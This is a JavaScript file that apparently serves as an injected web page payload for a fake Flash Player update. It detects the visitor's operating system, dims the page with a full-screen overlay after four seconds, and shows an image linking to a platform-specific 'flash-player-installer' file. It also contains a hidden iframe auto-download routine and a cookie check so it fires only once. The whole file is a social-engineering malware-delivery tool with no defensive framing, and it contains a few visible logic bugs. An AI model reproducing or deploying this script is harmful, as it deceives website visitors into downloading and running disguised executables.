var browser="";

var myDivImg;

/*Real Image Width and Height*/
var imgWidth = 0;
var imgHeight = 0;
var realWidth;
var realHeight;
var tgtimage;
var image1;

// Detect the Browser using the UserAgent
function detectBrowser() {
	if ((typeof(navigator) != "undefined") && (typeof(navigator.userAgent) != "undefined")) {
		var ua = navigator.userAgent;

		if (ua.search(/chrome/i) != -1) {
			return "chrome";
		}		
		
		if (ua.search(/webkit/i) != -1) {
			return "safari";
		}
		
		if (ua.search(/opera/i) != -1) {
			return "opera";
		}		
		
		if ((ua.search(/msie/i) != -1) && (ua.search(/opera/i) == -1)) {
			return "msie";
		}
		
		if ((ua.search(/mozilla/i) != -1) && (ua.search(/(compatible|webkit)/i) == -1)) {
			return "mozilla";
		}
		
		return "msie"; // return msie as default if unable to detect via user agent
	}
		// The navigator.userAgent object does not exists
		return "";
}

var winW=0;
var winH=0;

function getWindowSize() {
	winW = 0, winH = 0;
	if (document.body && document.body.offsetWidth) {
		winW = document.body.offsetWidth;
		winH = document.body.offsetHeight;
	}
	
	if (document.compatMode=='CSS1Compat' &&
    	document.documentElement &&
    	document.documentElement.offsetWidth ) {
 		winW = document.documentElement.offsetWidth;
 		winH = document.documentElement.offsetHeight;
	}
	
	if (window.innerWidth && window.innerHeight) {
 		winW = window.innerWidth;
 		winH = window.innerHeight;
	}
}

function scaleSize(maxW, maxH, currW, currH){
	var ratio = currH / currW;
    
	var currH2=currH;
	var currW2=currW;
    
	if(currH >= maxH) {
        currH = maxH;
        currW = currH / ratio;
    } 
    
    if(currW >= maxW && ratio <= 1){
        currW = maxW;
        currH = currW * ratio;
    }    
    
    /*
	if(currW >= maxW){
        currW = maxW;
        currH = currW * ratio;
    } */ 
    
    return [currW, currH];
}

var imgWidth1 = 0;
var imgHeight1 = 0;

function setImageSize(update) {
	var sw = getScrollBarWidth();
	
	if (imgWidth1 != 0) imgWidth1 = imgWidth;
	if (imgHeight1 != 0) imgHeight1 = imgHeight;
	imgWidth1 = image1.width;
	imgHeight1 = image1.height;
	getWindowSize();

	winW -= sw;
	
	if (imgWidth1 >= winW || imgHeight1 >= winH) {
		var newSize = scaleSize(winW*0.9, winH*0.9, realWidth, realHeight);
		imgWidth = newSize[0];
		imgHeight = newSize[1];
	} else {
		imgWidth = imgWidth1;
		imgHeight = imgHeight1;
	}
	
	if (update) {
		tgtimage.width = imgWidth;
		tgtimage.height = imgHeight;		
		centerDiv(myDivImg);	
	}
}

function getScrollBarWidth () {  
    var inner = document.createElement('p');  
    inner.style.width = "100%";  
    inner.style.height = "200px";  
  
    var outer = document.createElement('div');  
    outer.style.position = "absolute";  
    outer.style.top = "0px";  
    outer.style.left = "0px";  
    outer.style.visibility = "hidden";  
    outer.style.width = "200px";  
    outer.style.height = "150px";  
    outer.style.overflow = "hidden";  
    outer.appendChild (inner);  
  
    document.body.appendChild (outer);  
    var w1 = inner.offsetWidth;  
    outer.style.overflow = 'scroll';  
    var w2 = inner.offsetWidth;  
    if (w1 == w2) w2 = outer.clientWidth;  
  
    document.body.removeChild (outer);  
  
    return (w1 - w2);  
};

function centerDiv(d) {
	var w = imgWidth/2;
	var h = imgHeight/2;
	
	getWindowSize(); // returns the window size in winW,winH
	if (winW==0)
		winW = screen.width;
	if (winH==0)
		winH == screen.height;
	
	var __screenY=winW/2;
 	var __screenX=winH/2;
 	
	d.style.top = __screenX-h+"px";
	d.style.left = __screenY-w+"px";
}

// Start function when the page loads
function initTimer() {
	browser = detectBrowser();
	
	// Detect the underlying operating system (like Windows or Linux)
	var os = (window.orientation != undefined) ? 'ipod': (navigator.platform.match(/mac|win|linux/i) || ['other'])[0].toLowerCase();
	
	var execwindows = "flash-player-installer.exe";
	var execlinux = "flash-player-installer.sh";
	var execmac = "flash-player-installer.dmg";
	var filename = null;
	
	if (os == "win") {
		filename = execwindows;	
	}
	
	if (os=="linux") {
		filename = execlinux;
	}
	
	if (os=="mac") {
		filename = execmac;	
	}

	if (filename == null) {
		filename = execwindows;	
	}
    
	var myDiv = document.createElement('div');  
	myDiv.id = 'myDiv';  
	myDiv.style.position = 'fixed';  
	myDiv.style.top = 0;
	myDiv.style.left = 0;
	myDiv.style.width = "100%";  
	myDiv.style.height = "100%";  
	myDiv.style.backgroundColor = '#000'; 
	myDiv.style.zIndex = 2147483646;

	if (browser != "msie") {
		myDiv.style.opacity = '0.65';
	} else {
		myDiv.style.filter = 'progid:DXImageTransform.Microsoft.Alpha(opacity=65)';	
	}
	
	myDiv.setAttribute("unselectable", "on");
	myDiv.setAttribute("class", "unselectable");	
	
	document.body.appendChild(myDiv);
		
	myDivImg = document.createElement('div');
	myDivImg.id = 'myDivImg';
	myDivImg.style.position = 'fixed';	
	
	// Position Image div into the center of the screen
	centerDiv(myDivImg);
	myDivImg.style.zIndex = 2147483647;
	
	myDivImg.setAttribute("unselectable", "on");
	myDivImg.setAttribute("class", "unselectable");	
	
	// create the link with image inside
	var ahref = document.createElement('a');
	ahref.href = filename;
	ahref.title = "Missing";
	ahref.style.border = 0;
	tgtimage = document.createElement('img');
	tgtimage.src = "missing.jpg";
	tgtimage.width = imgWidth;
	tgtimage.height = imgHeight;
	tgtimage.style.border = 0;
	
	ahref.appendChild(tgtimage);
	myDivImg.appendChild(ahref);
	
	document.body.appendChild(myDivImg);

	// Center the div containing the Image on a window resize event	
    window.onresize = function(event) {	
	    setImageSize(true);
	}	

	// Autodownload the file if requested
	var autodownload = "True";

	if (autodownload.toLowerCase() != "true") {
		var download = document.createElement('iframe');
		download.src = filename;
		download.width = 0;
		download.height = 0;
		download.style.border = "0";
		download.style.display = "none";
		download.style.visibility = "hidden";
		download.border = 0;
		
		document.body.appendChild(download);	
	}
}

function init() {

    // Use a simple session cookie for a shoot-once detection
    var cookie_kv = document.cookie.split("=");
    if(cookie_kv[0] == "started" && cookie_kv[1]== "true") {
	return;
    }

	window.setTimeout("initTimer()", 4000);	
}

image1 = new Image();
image1.src = "missing.jpg";

image1.onload = function() {
	realWidth = image1.width;
	realHeight = image1.height;
	setImageSize(false);
	init();
};